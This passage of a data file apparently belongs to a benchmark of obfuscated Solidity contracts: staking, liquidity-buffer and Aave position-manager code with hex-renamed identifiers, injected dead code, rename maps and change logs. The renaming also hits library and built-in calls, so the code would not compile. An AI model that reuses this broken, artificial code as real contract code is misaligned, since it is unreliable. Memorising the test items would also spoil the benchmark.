        "_receiveETHFromStaking": "_0x46319d",
        "topUpInterestToStaking": "_0x5f5a47",
        "totalAllocatedBalance": "_0x8bf61e",
        "totalInterestToppedUp": "_0x81e45a",
        "_allocateETHToManager": "_0x9e4c76",
        "setCumulativeDrawdown": "_0xe4acb2",
        "claimInterestAndTopUp": "_0x364c09",
        "updatePositionManager": "_0xae0fef",
        "allocateETHToManager": "_0x01d393",
        "_disableInitializers": "_0xa6d954",
        "totalInterestClaimed": "_0xa6f948",
        "getAvailableCapacity": "_0x681854",
        "getUnderlyingBalance": "_0x63bfac",
        "positionManagerCount": "_0x17d808",
        "getControlledBalance": "_0x29ad57",
        "positionAccountants": "_0x2d47a2",
        "newDefaultManagerId": "_0x9cbbb2",
        "_returnETHToStaking": "_0xb0c6ff",
        "isRegisteredManager": "_0x768af4",
        "onlyStakingContract": "_0xc250b2",
        "getAvailableBalance": "_0x6e8582",
        "setDefaultManagerId": "_0xb5252a",
        "totalFeesCollected": "_0x347d5d",
        "totalFundsReturned": "_0x2e0d41",
        "totalFundsReceived": "_0xce09b7",
        "returnETHToStaking": "_0x9d3644",
        "cumulativeDrawdown": "_0xed88a1",
        "addPositionManager": "_0xa182d2",
        "executeAllocation": "_0xf4a6cc",
        "withdrawAndReturn": "_0xbe3fee",
        "getInterestAmount": "_0xa92e91",
        "setFeeBasisPoints": "_0x8d4d2a",
        "allocatedBalance": "_0xd05bb1",
        "newAllocationCap": "_0x24ca28",
        "defaultManagerId": "_0xceee67",
        "pendingPrincipal": "_0x7fd0e8",
        "liquidityManager": "_0x5506c6",
        "feesBasisPoints": "_0x473226",
        "pendingInterest": "_0x0e05d2",
        "positionManager": "_0x4e6f2d",
        "setFeesReceiver": "_0xad2c29",
        "drawdownManager": "_0x6232ac",
        "stakingContract": "_0xdbc6e1",
        "newBasisPoints": "_0x7cef2a",
        "managerBalance": "_0x92c5cb",
        "isValidManager": "_0xf56a9b",
        "managerAddress": "_0x1d6d81",
        "currentBalance": "_0xc22497",
        "notZeroAddress": "_0x1007a4",
        "drawdownAmount": "_0xcbded0",
        "interestAmount": "_0xa8a418",
        "allocationCap": "_0x76632c",
        "interestTopUp": "_0x222f2c",
        "totalBalance": "_0xf8b81b",
        "feesReceiver": "_0xf1f730",
        "newReceiver": "_0x51ff04",
        "initializer": "_0x4e8197",
        "topUpAmount": "_0x6eb935",
        "_grantRole": "_0x6cdea4",
        "accounting": "_0x405543",
        "initialize": "_0xa24dcf",
        "depositETH": "_0xd2784f",
        "minAmount": "_0xa2402d",
        "managerId": "_0x49f1d8",
        "keccak256": "_0x0e05a7",
        "sendValue": "_0xc1ee37",
        "isActive": "_0x086ee9",
        "withdraw": "_0x7d9d12",
        "onlyRole": "_0xb5080f",
        "manager": "_0x0c6afd",
        "deposit": "_0x4da048",
        "staking": "_0x2e458b",
        "mulDiv": "_0xeaa9a9",
        "encode": "_0xf325ce",
        "config": "_0xf8a554",
        "pauser": "_0x442a16",
        "amount": "_0x149c6a",
        "admin": "_0xc895e4",
        "topUp": "_0x1b803e",
        "addr": "_0x186818",
        "init": "_0x9b4dbf",
        "fees": "_0xdc61fd"
      },
      "changes": [
        "Renamed 98 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_gs_025",
      "transformed_id": "ss_l4_medium_sn_gs_025",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\nimport {Initializable} from \"openzeppelin-upgradeable/proxy/utils/Initializable.sol\";\nimport {AccessControlEnumerableUpgradeable} from\n    \"openzeppelin-upgradeable/access/AccessControlEnumerableUpgradeable.sol\";\nimport {Math} from \"openzeppelin/utils/math/Math.sol\";\nimport {IERC20} from \"openzeppelin/token/ERC20/IERC20.sol\";\nimport {SafeERC20Upgradeable} from \"openzeppelin-upgradeable/token/ERC20/utils/SafeERC20Upgradeable.sol\";\n\nimport {ProtocolEvents} from \"./interfaces/ProtocolEvents.sol\";\nimport {IDepositContract} from \"./interfaces/IDepositContract.sol\";\nimport {IMETH} from \"./interfaces/IMETH.sol\";\nimport {IOracleReadRecord, OracleRecord} from \"./interfaces/IOracle.sol\";\nimport {IPauserRead} from \"./interfaces/IPauser.sol\";\nimport {IStaking, IStakingReturnsWrite, IStakingInitiationRead} from \"./interfaces/IStaking.sol\";\nimport {UnstakeRequest, IUnstakeRequestsManager} from \"./interfaces/IUnstakeRequestsManager.sol\";\n\nimport {ILiquidityBuffer} from \"./liquidityBuffer/interfaces/ILiquidityBuffer.sol\";\n\n/// @notice Events emitted by the staking contract.\ninterface StakingEvents {\n    /// @notice Emitted when a user stakes ETH and receives mETH.\n    event Staked(address indexed _0xf87806, uint256 _0x938e5e, uint256 _0x61c4ef);\n\n    /// @notice Emitted when a user unstakes mETH in exchange for ETH.\n    event UnstakeRequested(uint256 indexed _0x0de6c4, address indexed _0xf87806, uint256 _0x938e5e, uint256 _0x339ced);\n\n    /// @notice Emitted when a user claims their unstake request.\n    event UnstakeRequestClaimed(uint256 indexed _0x0de6c4, address indexed _0xf87806);\n\n    /// @notice Emitted when a validator has been initiated.\n    event ValidatorInitiated(bytes32 indexed _0x0de6c4, uint256 indexed _0x65c9b5, bytes _0xbc9924, uint256 _0x92aea1);\n\n    /// @notice Emitted when the protocol has allocated ETH to the UnstakeRequestsManager.\n    event AllocatedETHToUnstakeRequestsManager(uint256 _0xe37902);\n\n    /// @notice Emitted when the protocol has allocated ETH to use for deposits into the deposit contract.\n    event AllocatedETHToDeposits(uint256 _0xe37902);\n\n    /// @notice Emitted when the protocol has received returns from the returns aggregator.\n    event ReturnsReceived(uint256 _0xe37902);\n\n    /// @notice Emitted when the protocol has received returns from the returns aggregator.\n    event ReturnsReceivedFromLiquidityBuffer(uint256 _0xe37902);\n\n    /// @notice Emitted when the protocol has allocated ETH to the liquidity buffer.\n    event AllocatedETHToLiquidityBuffer(uint256 _0xe37902);\n}\n\n/// @title Staking\n/// @notice Manages stake and unstake requests by users.\ncontract Staking is Initializable, AccessControlEnumerableUpgradeable, IStaking, StakingEvents, ProtocolEvents {\n    // Errors.\n    error DoesNotReceiveETH();\n    error InvalidConfiguration();\n    error MaximumValidatorDepositExceeded();\n    error MaximumMETHSupplyExceeded();\n    error MinimumStakeBoundNotSatisfied();\n    error MinimumUnstakeBoundNotSatisfied();\n    error MinimumValidatorDepositNotSatisfied();\n    error NotEnoughDepositETH();\n    error NotEnoughUnallocatedETH();\n    error NotReturnsAggregator();\n    error NotLiquidityBuffer();\n    error NotUnstakeRequestsManager();\n    error Paused();\n    error PreviouslyUsedValidator();\n    error ZeroAddress();\n    error InvalidDepositRoot(bytes32);\n    error StakeBelowMinimumMETHAmount(uint256 _0xa1b953, uint256 _0xb9fe2b);\n    error UnstakeBelowMinimumETHAmount(uint256 _0x938e5e, uint256 _0xb9fe2b);\n\n    error InvalidWithdrawalCredentialsWrongLength(uint256);\n    error InvalidWithdrawalCredentialsNotETH1(bytes12);\n    error InvalidWithdrawalCredentialsWrongAddress(address);\n\n    bytes32 public constant STAKING_MANAGER_ROLE = _0x5221b1(\"STAKING_MANAGER_ROLE\");\n    bytes32 public constant ALLOCATOR_SERVICE_ROLE = _0x5221b1(\"ALLOCATER_SERVICE_ROLE\");\n    bytes32 public constant INITIATOR_SERVICE_ROLE = _0x5221b1(\"INITIATOR_SERVICE_ROLE\");\n    bytes32 public constant STAKING_ALLOWLIST_MANAGER_ROLE = _0x5221b1(\"STAKING_ALLOWLIST_MANAGER_ROLE\");\n    bytes32 public constant STAKING_ALLOWLIST_ROLE = _0x5221b1(\"STAKING_ALLOWLIST_ROLE\");\n    bytes32 public constant TOP_UP_ROLE = _0x5221b1(\"TOP_UP_ROLE\");\n\n    struct ValidatorParams {\n        uint256 _0x65c9b5;\n        uint256 _0xd26cd0;\n        bytes _0xbc9924;\n        bytes _0x5f468b;\n        bytes _0x748167;\n        bytes32 _0x470a16;\n    }\n\n    mapping(bytes _0xbc9924 => bool _0x60ecd6) public _0x136e00;\n    uint256 public _0xd84996;\n    uint256 public _0x38729d;\n    uint256 public _0xc4d89d;\n    uint256 public _0xfc4348;\n    uint256 public _0x9ed854;\n    uint256 public _0x4e849b;\n    uint16 public _0x737088;\n    uint16 internal constant _0xb659a8 = 10_000;\n    uint16 internal constant _0x8723ec = _0xb659a8 / 10;\n    uint256 public _0x1c163d;\n    uint256 public _0xbbc282;\n    IDepositContract public _0x14fdb9;\n    IMETH public _0xfac942;\n    IOracleReadRecord public _0xe30c9b;\n    IPauserRead public _0x620fc1;\n    IUnstakeRequestsManager public _0x58f636;\n    address public _0x201f8f;\n    address public _0x62a364;\n    bool public _0x525ba5;\n    uint256 public _0x400757;\n    uint256 public _0xde68a8;\n    ILiquidityBuffer public _0x0e181e;\n\n    struct Init {\n        address _0x58cf36;\n        address _0x5e2aaa;\n        address _0xaeb9f2;\n        address _0xe7df16;\n        address _0x62a364;\n        address _0x201f8f;\n        IMETH _0xfac942;\n        IDepositContract _0x14fdb9;\n        IOracleReadRecord _0xe30c9b;\n        IPauserRead _0x620fc1;\n        IUnstakeRequestsManager _0x58f636;\n    }\n\n    constructor() {\n        _0xd5377c();\n    }\n\n    function _0x6dd850(Init memory _0x509b57) external _0x4adc52 {\n        bool _flag1 = false;\n        uint256 _unused2 = 0;\n        __AccessControlEnumerable_init();\n\n        _0x333e7e(DEFAULT_ADMIN_ROLE, _0x509b57._0x58cf36);\n        _0x333e7e(STAKING_MANAGER_ROLE, _0x509b57._0x5e2aaa);\n        _0x333e7e(ALLOCATOR_SERVICE_ROLE, _0x509b57._0xaeb9f2);\n        _0x333e7e(INITIATOR_SERVICE_ROLE, _0x509b57._0xe7df16);\n\n        _0xf73c4a(STAKING_ALLOWLIST_MANAGER_ROLE, STAKING_MANAGER_ROLE);\n        _0xf73c4a(STAKING_ALLOWLIST_ROLE, STAKING_ALLOWLIST_MANAGER_ROLE);\n\n        _0xfac942 = _0x509b57._0xfac942;\n        _0x14fdb9 = _0x509b57._0x14fdb9;\n        if (gasleft() > 0) { _0xe30c9b = _0x509b57._0xe30c9b; }\n        if (true) { _0x620fc1 = _0x509b57._0x620fc1; }\n        if (block.timestamp > 0) { _0x62a364 = _0x509b57._0x62a364; }\n        _0x58f636 = _0x509b57._0x58f636;\n        if (1 == 1) { _0x201f8f = _0x509b57._0x201f8f; }\n\n        if (true) { _0x9ed854 = 0.1 ether; }\n        _0x4e849b = 0.01 ether;\n        _0x1c163d = 32 ether;\n        if (block.timestamp > 0) { _0xbbc282 = 32 ether; }\n        _0x525ba5 = true;\n        _0x400757 = block.number;\n        if (msg.sender != address(0) || msg.sender == address(0)) { _0xde68a8 = 1024 ether; }\n    }\n\n    function _0x253721(ILiquidityBuffer _0xdde05d) public _0xc70307(2) {\n        if (false) { revert(); }\n        bool _flag4 = false;\n        _0x0e181e = _0xdde05d;\n    }\n\n    function _0x2ee44a(uint256 _0xaa02f1) external payable {\n        if (_0x620fc1._0xe09627()) {\n            revert Paused();\n        }\n\n        if (_0x525ba5) {\n            _0x852034(STAKING_ALLOWLIST_ROLE);\n        }\n\n        if (msg.value < _0x9ed854) {\n            revert MinimumStakeBoundNotSatisfied();\n        }\n\n        uint256 _0x231fef = _0x955bbc(msg.value);\n        if (_0x231fef + _0xfac942._0x9b2fd8() > _0xde68a8) {\n            revert MaximumMETHSupplyExceeded();\n        }\n        if (_0x231fef < _0xaa02f1) {\n            revert StakeBelowMinimumMETHAmount(_0x231fef, _0xaa02f1);\n        }\n\n        _0xc4d89d += msg.value;\n\n        emit Staked(msg.sender, msg.value, _0x231fef);\n        _0xfac942._0xba5473(msg.sender, _0x231fef);\n    }\n\n    function _0x257696(uint128 _0xa1b953, uint128 _0x47a94d) external returns (uint256) {\n        return _0xf9f9a3(_0xa1b953, _0x47a94d);\n    }\n\n    function _0xcbe881(\n        uint128 _0xa1b953,\n        uint128 _0x47a94d,\n        uint256 _0x0058e4,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external returns (uint256) {\n        SafeERC20Upgradeable._0xe79faa(_0xfac942, msg.sender, address(this), _0xa1b953, _0x0058e4, v, r, s);\n        return _0xf9f9a3(_0xa1b953, _0x47a94d);\n    }\n\n    function _0xf9f9a3(uint128 _0xa1b953, uint128 _0x47a94d) internal returns (uint256) {\n        if (_0x620fc1._0xc0a410()) {\n            revert Paused();\n        }\n\n        if (_0xa1b953 < _0x4e849b) {\n            revert MinimumUnstakeBoundNotSatisfied();\n        }\n\n        uint128 _0x938e5e = uint128(_0x36398b(_0xa1b953));\n        if (_0x938e5e < _0x47a94d) {\n            revert UnstakeBelowMinimumETHAmount(_0x938e5e, _0x47a94d);\n        }\n\n        uint256 _0xe7a7d0 =\n            _0x58f636._0xcb3cb9({_0x05f0c4: msg.sender, _0x339ced: _0xa1b953, _0x9c001c: _0x938e5e});\n        emit UnstakeRequested({_0x0de6c4: _0xe7a7d0, _0xf87806: msg.sender, _0x938e5e: _0x938e5e, _0x339ced: _0xa1b953});\n\n        SafeERC20Upgradeable._0x47b1a4(_0xfac942, msg.sender, address(_0x58f636), _0xa1b953);\n\n        return _0xe7a7d0;\n    }\n\n    function _0x955bbc(uint256 _0x938e5e) public view returns (uint256) {\n        if (_0xfac942._0x9b2fd8() == 0) {\n            return _0x938e5e;\n        }\n        uint256 _0x5cad44 = Math._0xbcc01d(\n            _0x0cc075(), _0xb659a8 + _0x737088, _0xb659a8\n        );\n        return Math._0xbcc01d(_0x938e5e, _0xfac942._0x9b2fd8(), _0x5cad44);\n    }\n\n    function _0x36398b(uint256 _0x61c4ef) public view returns (uint256) {\n        if (_0xfac942._0x9b2fd8() == 0) {\n            return _0x61c4ef;\n        }\n        return Math._0xbcc01d(_0x61c4ef, _0x0cc075(), _0xfac942._0x9b2fd8());\n    }\n\n    function _0x0cc075() public view returns (uint256) {\n        OracleRecord memory _0x99a17f = _0xe30c9b._0x2448d5();\n        uint256 _0x103e04 = 0;\n        _0x103e04 += _0xc4d89d;\n        _0x103e04 += _0xfc4348;\n        _0x103e04 += _0xd84996 - _0x99a17f._0x4e452c;\n        _0x103e04 += _0x99a17f._0x776f07;\n        _0x103e04 += _0x0e181e._0x418e17();\n        _0x103e04 -= _0x0e181e._0xb7fc4b();\n        _0x103e04 += _0x58f636.balance();\n        return _0x103e04;\n    }\n\n    function _0xc03c14() external payable _0xa9ee9d {\n        emit ReturnsReceived(msg.value);\n        _0xc4d89d += msg.value;\n    }\n\n    function _0x663c13() external payable _0xab3bf7 {\n        emit ReturnsReceivedFromLiquidityBuffer(msg.value);\n        _0xc4d89d += msg.value;\n    }\n\n    modifier _0xa9ee9d() {\n        if (msg.sender != _0x62a364) {\n            revert NotReturnsAggregator();\n        }\n        _;\n    }\n\n    modifier _0xab3bf7() {\n        if (msg.sender != address(_0x0e181e)) {\n            revert NotLiquidityBuffer();\n        }\n        _;\n    }\n\n    modifier _0xd05c96() {\n        if (msg.sender != address(_0x58f636)) {\n            revert NotUnstakeRequestsManager();\n        }\n        _;\n    }\n\n    modifier _0xde6c7d(address _0xff5e35) {\n        if (_0xff5e35 == address(0)) {\n            revert ZeroAddress();\n        }\n        _;\n    }\n\n    receive() external payable {\n        revert DoesNotReceiveETH();\n    }\n\n    fallback() external payable {\n        revert DoesNotReceiveETH();\n    }\n}",
      "rename_map": {
        "receiveReturnsFromLiquidityBuffer": "_0x663c13",
        "isUnstakeRequestsAndClaimsPaused": "_0xc0a410",
        "cumulativeProcessedDepositAmount": "_0x4e452c",
        "_MAX_EXCHANGE_ADJUSTMENT_RATE": "_0x8723ec",
        "currentTotalValidatorBalance": "_0x776f07",
        "onlyUnstakeRequestsManager": "_0xd05c96",
        "totalDepositedInValidators": "_0xd84996",
        "initializationBlockNumber": "_0x400757",
        "_BASIS_POINTS_DENOMINATOR": "_0xb659a8",
        "unstakeRequestWithPermit": "_0xcbe881",
        "adjustedTotalControlled": "_0x5cad44",
        "allocatedETHForDeposits": "_0xfc4348",
        "unstakeRequestsManager": "_0x58f636",
        "exchangeAdjustmentRate": "_0x737088",
        "numInitiatedValidators": "_0x38729d",
        "withdrawalCredentials": "_0x5f468b",
        "onlyReturnsAggregator": "_0xa9ee9d",
        "_disableInitializers": "_0xd5377c",
        "maximumDepositAmount": "_0xbbc282",
        "minimumDepositAmount": "_0x1c163d",
        "minimumUnstakeBound": "_0x4e849b",
        "getAvailableBalance": "_0x418e17",
        "onlyLiquidityBuffer": "_0xab3bf7",
        "isStakingAllowlist": "_0x525ba5",
        "cumulativeDrawdown": "_0xb7fc4b",
        "minimumStakeBound": "_0x9ed854",
        "maximumMETHSupply": "_0xde68a8",
        "returnsAggregator": "_0x62a364",
        "withdrawalWallet": "_0x201f8f",
        "safeTransferFrom": "_0x47b1a4",
        "allocatorService": "_0xaeb9f2",
        "initiatorService": "_0xe7df16",
        "totalControlled": "_0x0cc075",
        "amountDeposited": "_0x92aea1",
        "liquidityBuffer": "_0x0e181e",
        "depositContract": "_0x14fdb9",
        "expectedMinimum": "_0xb9fe2b",
        "_unstakeRequest": "_0xf9f9a3",
        "isStakingPaused": "_0xe09627",
        "depositDataRoot": "_0x470a16",
        "unallocatedETH": "_0xc4d89d",
        "notZeroAddress": "_0xde6c7d",
        "receiveReturns": "_0xc03c14",
        "usedValidators": "_0x136e00",
        "mETHMintAmount": "_0x231fef",
        "unstakeRequest": "_0x257696",
        "minMETHAmount": "_0xaa02f1",
        "depositAmount": "_0xd26cd0",
        "_setRoleAdmin": "_0xf73c4a",
        "reinitializer": "_0xc70307",
        "latestRecord": "_0x2448d5",
        "ethRequested": "_0x9c001c",
        "minETHAmount": "_0x47a94d",
        "initializeV2": "_0x253721",
        "totalSupply": "_0x9b2fd8",
        "initializer": "_0x4adc52",
        "_checkRole": "_0x852034",
        "mETHAmount": "_0x61c4ef",
        "operatorID": "_0x65c9b5",
        "methAmount": "_0xa1b953",
        "_grantRole": "_0x333e7e",
        "mETHLocked": "_0x339ced",
        "safePermit": "_0xe79faa",
        "initialize": "_0x6dd850",
        "requestID": "_0xe7a7d0",
        "signature": "_0x748167",
        "ethToMETH": "_0x955bbc",
        "requester": "_0x05f0c4",
        "mETHToETH": "_0x36398b",
        "keccak256": "_0x5221b1",
        "ethAmount": "_0x938e5e",
        "deadline": "_0x0058e4",
        "manager": "_0x5e2aaa",
        "staker": "_0xf87806",
        "exists": "_0x60ecd6",
        "mulDiv": "_0xbcc01d",
        "record": "_0x99a17f",
        "pauser": "_0x620fc1",
        "oracle": "_0xe30c9b",
        "create": "_0xcb3cb9",
        "amount": "_0xe37902",
        "pubkey": "_0xbc9924",
        "admin": "_0x58cf36",
        "total": "_0x103e04",
        "stake": "_0x2ee44a",
        "addr": "_0xff5e35",
        "init": "_0x509b57",
        "mETH": "_0xfac942",
        "mint": "_0xba5473",
        "id": "_0x0de6c4",
        "lb": "_0xdde05d"
      },
      "changes": [
        "Renamed 91 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_gs_026",
      "transformed_id": "ss_l4_medium_sn_gs_026",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\nimport {Initializable} from \"openzeppelin-upgradeable/proxy/utils/Initializable.sol\";\nimport {AccessControlEnumerableUpgradeable} from\n    \"openzeppelin-upgradeable/access/AccessControlEnumerableUpgradeable.sol\";\nimport {SafeERC20} from \"openzeppelin/token/ERC20/utils/SafeERC20.sol\";\nimport {IERC20} from \"openzeppelin/token/ERC20/IERC20.sol\";\nimport {IPool} from \"aave-v3/interfaces/IPool.sol\";\nimport {DataTypes} from \"aave-v3/protocol/libraries/types/DataTypes.sol\";\nimport {IPositionManager} from './interfaces/IPositionManager.sol';\nimport {IWETH} from \"./interfaces/IWETH.sol\";\nimport {ILiquidityBuffer} from \"../liquidityBuffer/interfaces/ILiquidityBuffer.sol\";\n\n/**\n * @title PositionManager\n * @dev Position manager with role-based access control\n * inspired by WrappedTokenGatewayV3 0xd01607c3c5ecaba394d8be377a08590149325722\n */\ncontract PositionManager is Initializable, AccessControlEnumerableUpgradeable, IPositionManager {\n    using SafeERC20 for IERC20;\n\n    // Role definitions\n    bytes32 public constant EXECUTOR_ROLE = _0x8b0a66(\"EXECUTOR_ROLE\");\n    bytes32 public constant MANAGER_ROLE = _0x8b0a66(\"MANAGER_ROLE\");\n    bytes32 public constant EMERGENCY_ROLE = _0x8b0a66(\"EMERGENCY_ROLE\");\n\n    // State variables\n    IPool public _0x4f4258;\n    IWETH public _0x48e9e7;\n    ILiquidityBuffer public _0x2b12c0;\n\n    /// @notice Configuration for contract initialization.\n    struct Init {\n        address _0x4f63b6;\n        address _0x2a6fd9;\n        ILiquidityBuffer _0x2b12c0;\n        IWETH _0x48e9e7;\n        IPool _0x4f4258;\n    }\n\n    // Events\n    event Deposit(address indexed _0xfa06f7, uint _0x67c1ea, uint _0x7e6c96);\n    event Withdraw(address indexed _0xfa06f7, uint _0x67c1ea);\n    event Borrow(address indexed _0xfa06f7, uint _0x67c1ea, uint _0x2e5974);\n    event Repay(address indexed _0xfa06f7, uint _0x67c1ea, uint _0x2e5974);\n    event SetUserEMode(address indexed _0xfa06f7, uint8 _0x9ffecb);\n\n    constructor() {\n        _0xae01c7();\n    }\n\n    function _0xd40f22(Init memory _0x6bd628) external _0x632341 {\n        uint256 _unused1 = 0;\n        uint256 _unused2 = 0;\n        __AccessControlEnumerable_init();\n\n        _0x48e9e7 = _0x6bd628._0x48e9e7;\n        if (1 == 1) { _0x4f4258 = _0x6bd628._0x4f4258; }\n        if (1 == 1) { _0x2b12c0 = _0x6bd628._0x2b12c0; }\n\n        // Set up roles\n        _0x4bc05a(DEFAULT_ADMIN_ROLE, _0x6bd628._0x4f63b6);\n        _0x4bc05a(MANAGER_ROLE, _0x6bd628._0x2a6fd9);\n        _0x4bc05a(EXECUTOR_ROLE, address(_0x6bd628._0x2b12c0));\n\n        // Approve pool to spend WETH\n        _0x48e9e7._0x241cae(address(_0x4f4258), type(uint256)._0xbf0d9f);\n    }\n\n    // IPositionManager Implementation\n\n    function _0x616d33(uint16 _0xa73e8a) external payable override _0x424687(EXECUTOR_ROLE) {\n        bool _flag3 = false;\n        bool _flag4 = false;\n        if (msg.value > 0) {\n            // Wrap ETH to WETH\n            _0x48e9e7._0x616d33{value: msg.value}();\n\n            // Deposit WETH into pool\n            _0x4f4258._0x616d33(address(_0x48e9e7), msg.value, address(this), _0xa73e8a);\n\n            emit Deposit(msg.sender, msg.value, msg.value);\n        }\n    }\n\n    function _0x8afd15(uint256 _0x67c1ea) external override _0x424687(EXECUTOR_ROLE) {\n        require(_0x67c1ea > 0, 'Invalid _0x67c1ea');\n\n        // Get aWETH token\n        IERC20 _0x7e0c57 = IERC20(_0x4f4258._0x738b9a(address(_0x48e9e7)));\n        uint256 _0x15becb = _0x7e0c57._0x9f6f2e(address(this));\n\n        uint256 _0x64bd04 = _0x67c1ea;\n        if (_0x67c1ea == type(uint256)._0xbf0d9f) {\n            _0x64bd04 = _0x15becb;\n        }\n\n        require(_0x64bd04 <= _0x15becb, 'Insufficient balance');\n\n        // Withdraw from pool\n        _0x4f4258._0x8afd15(address(_0x48e9e7), _0x64bd04, address(this));\n\n        // Unwrap WETH to ETH\n        _0x48e9e7._0x8afd15(_0x64bd04);\n\n        // Transfer ETH to LiquidityBuffer via receiveETHFromPositionManager\n        _0x2b12c0._0x216a92{value: _0x64bd04}();\n\n        emit Withdraw(msg.sender, _0x64bd04);\n    }\n\n    function _0xd94f9a() external view returns (uint256) {\n        IERC20 _0x7e0c57 = IERC20(_0x4f4258._0x738b9a(address(_0x48e9e7)));\n        return _0x7e0c57._0x9f6f2e(address(this));\n    }\n\n    function _0x669140(uint8 _0x9ffecb) external override _0x424687(MANAGER_ROLE) {\n        // Set user E-mode category\n        _0x4f4258._0x669140(_0x9ffecb);\n\n        emit SetUserEMode(msg.sender, _0x9ffecb);\n    }\n    function _0xc56d2c(address _0x25e088, address _0x0d90b2, uint256 _0xb14f09) external override _0x424687(MANAGER_ROLE) {\n        IERC20(_0x25e088)._0x97eb57(_0x0d90b2, _0xb14f09);\n    }\n\n    function _0x1dc1ac(address _0x25e088, address _0x0d90b2) external override _0x424687(MANAGER_ROLE) {\n        IERC20(_0x25e088)._0x97eb57(_0x0d90b2, 0);\n    }\n\n    // Additional helper functions\n\n    function _0xf7cee7() external view returns (uint256) {\n        address _0x2bf866 = _0x4f4258._0x0980f4(address(_0x48e9e7));\n        return IERC20(_0x2bf866)._0x9f6f2e(address(this));\n    }\n\n    function _0xb5f878() external view returns (uint256) {\n        IERC20 _0x7e0c57 = IERC20(_0x4f4258._0x738b9a(address(_0x48e9e7)));\n        return _0x7e0c57._0x9f6f2e(address(this));\n    }\n\n    function _0xb68a37() external view returns (uint256) {\n        return _0x4f4258._0xb68a37(address(this));\n    }\n\n    function _0x9cfb37(address _0x75e3af, bool _0xab0e09) external _0x424687(MANAGER_ROLE) {\n        _0x4f4258._0x9cfb37(_0x75e3af, _0xab0e09);\n    }\n\n    function _0x5808ff(address _0x34b98e) external _0x424687(MANAGER_ROLE) {\n        _0x16b73d(EXECUTOR_ROLE, address(_0x2b12c0));\n        _0x4bc05a(EXECUTOR_ROLE, _0x34b98e);\n        if (gasleft() > 0) { _0x2b12c0 = ILiquidityBuffer(_0x34b98e); }\n    }\n\n    /**\n    * @dev transfer ERC20 from the utility contract, for ERC20 recovery in case of stuck tokens due\n    * direct transfers to the contract address.\n    * @param token token to transfer\n    * @param to recipient of the transfer\n    * @param amount amount to send\n    */\n    function _0xc789ef(address _0x25e088, address _0xd11a2a, uint256 _0x67c1ea) external _0x424687(EMERGENCY_ROLE) {\n        IERC20(_0x25e088)._0xde90cf(_0xd11a2a, _0x67c1ea);\n    }\n\n    /**\n    * @dev transfer native Ether from the utility contract, for native Ether recovery in case of stuck Ether\n    * due to selfdestructs or ether transfers to the pre-computed contract address before deployment.\n    * @param to recipient of the transfer\n    * @param amount amount to send\n    */\n    function _0x2e0038(address _0xd11a2a, uint256 _0x67c1ea) external _0x424687(EMERGENCY_ROLE) {\n        _0xcba49e(_0xd11a2a, _0x67c1ea);\n    }\n\n    /**\n     * @dev transfer ETH to an address, revert if it fails.\n     * @param to recipient of the transfer\n     * @param value the amount to send\n     */\n    function _0xcba49e(address _0xd11a2a, uint256 value) internal {\n        (bool _0x519517, ) = _0xd11a2a.call{value: value}(new bytes(0));\n        require(_0x519517, 'ETH_TRANSFER_FAILED');\n    }\n\n    /**\n    * @dev Only WETH contract is allowed to transfer ETH here. Prevent other addresses to send Ether to this contract.\n    */\n    receive() external payable {\n        require(msg.sender == address(_0x48e9e7), 'Receive not allowed');\n    }\n\n    /**\n    * @dev Revert fallback calls\n    */\n    fallback() external payable {\n        revert('Fallback not allowed');\n    }\n}",
      "rename_map": {
        "receiveETHFromPositionManager": "_0x216a92",
        "setUserUseReserveAsCollateral": "_0x9cfb37",
        "getReserveVariableDebtToken": "_0x0980f4",
        "emergencyTokenTransfer": "_0xc789ef",
        "emergencyEtherTransfer": "_0x2e0038",
        "getCollateralBalance": "_0xb5f878",
        "getUnderlyingBalance": "_0xd94f9a",
        "_disableInitializers": "_0xae01c7",
        "setLiquidityBuffer": "_0x5808ff",
        "getReserveAToken": "_0x738b9a",
        "_liquidityBuffer": "_0x34b98e",
        "getBorrowBalance": "_0xf7cee7",
        "amountToWithdraw": "_0x64bd04",
        "_safeTransferETH": "_0xcba49e",
        "useAsCollateral": "_0xab0e09",
        "liquidityBuffer": "_0x2b12c0",
        "referralCode": "_0xa73e8a",
        "setUserEMode": "_0x669140",
        "safeTransfer": "_0xde90cf",
        "aTokenAmount": "_0x7e6c96",
        "getUserEMode": "_0xb68a37",
        "approveToken": "_0xc56d2c",
        "revokeToken": "_0x1dc1ac",
        "_revokeRole": "_0x16b73d",
        "safeApprove": "_0x97eb57",
        "initializer": "_0x632341",
        "userBalance": "_0x15becb",
        "_grantRole": "_0x4bc05a",
        "categoryId": "_0x9ffecb",
        "initialize": "_0xd40f22",
        "balanceOf": "_0x9f6f2e",
        "keccak256": "_0x8b0a66",
        "debtToken": "_0x2bf866",
        "rateMode": "_0x2e5974",
        "withdraw": "_0x8afd15",
        "onlyRole": "_0x424687",
        "manager": "_0x2a6fd9",
        "approve": "_0x241cae",
        "deposit": "_0x616d33",
        "success": "_0x519517",
        "amount": "_0x67c1ea",
        "caller": "_0xfa06f7",
        "token": "_0x25e088",
        "admin": "_0x4f63b6",
        "aWETH": "_0x7e0c57",
        "asset": "_0x75e3af",
        "addr": "_0x0d90b2",
        "init": "_0x6bd628",
        "pool": "_0x4f4258",
        "weth": "_0x48e9e7",
        "max": "_0xbf0d9f",
        "wad": "_0xb14f09",
        "to": "_0xd11a2a"
      },
      "changes": [
        "Renamed 53 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_gs_027",
      "transformed_id": "ss_l4_medium_sn_gs_027",
      "level": "l4",
